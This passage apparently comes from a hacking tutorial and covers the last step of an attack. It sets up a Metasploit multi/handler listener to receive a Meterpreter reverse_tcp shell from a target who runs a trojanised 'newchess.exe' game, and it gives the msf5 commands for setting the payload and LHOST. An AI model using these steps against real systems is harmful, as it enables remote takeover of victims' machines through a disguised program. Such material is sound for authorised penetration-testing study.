As a final step, we need to prepare our system to accept the connection from the target system when they execute the newchess.exe. We can do that by executing what Metasploit calls its “multi handler.”

This is simply a listener that Metasploit uses to listen for the payload calling back to the “mothership.” It will accept the connection and enable us to use the Meterpreter on the target. Then we need to tell the multi handler what type of payload to accept a connection (this must the same as the payload in the above newchess.exe game) from and the LHOST and LPORT.

msf5> use multi/handler msf5 > set PAYLOAD windows/x64/meterpreter/reverse_tcp msf5 > set LHOST 192.168.0.173
